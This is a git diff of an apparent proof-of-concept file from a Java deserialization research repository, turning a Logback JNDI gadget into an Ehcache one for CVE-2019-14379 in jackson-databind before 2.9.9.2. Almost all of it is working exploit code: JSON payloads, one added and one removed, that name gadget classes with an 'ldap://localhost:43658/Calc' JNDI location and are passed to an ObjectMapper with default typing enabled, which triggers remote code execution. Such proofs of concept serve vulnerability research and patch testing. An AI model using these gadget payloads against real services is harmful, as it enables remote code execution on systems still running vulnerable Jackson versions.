+++ jackson/src/main/java/com/threedr3am/bug/jackson/rce/EhcacheJndi.java
@@ -1,4 +1,4 @@
-package com.threedr3am.bug.jackson;
+package com.threedr3am.bug.jackson.rce;
 
 import com.fasterxml.jackson.databind.ObjectMapper;
 import com.threedr3am.bug.common.server.LdapServer;
@@ -6,13 +6,11 @@ import com.threedr3am.bug.common.server.RmiServer;
 import java.io.IOException;
 
 /**
- * logback jndi rce jackson < 2.9.9.2
- *
- * CVE-2019-14439
- *
+ * CVE-2019-14379
+ * jackson-databind RCE < 2.9.9.2
  * @author threedr3am
  */
-public class LogbackJndi {
+public class EhcacheJndi {
   static {
     //rmi server示例
 //    RmiServer.run();
@@ -23,10 +21,12 @@ public class LogbackJndi {
 
   public static void main(String[] args) throws IOException {
 
-    String json = "[\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://localhost:43658/Calc\"}]";
+    String json = "[\"net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup\"," +
+        "{\"properties\":{\"jndiName\":\"ldap://localhost:43658/Calc\"}}]";
     ObjectMapper mapper = new ObjectMapper();
     mapper.enableDefaultTyping();
     Object o = mapper.readValue(json, Object.class);
     mapper.writeValueAsString(o);
+
   }
 }
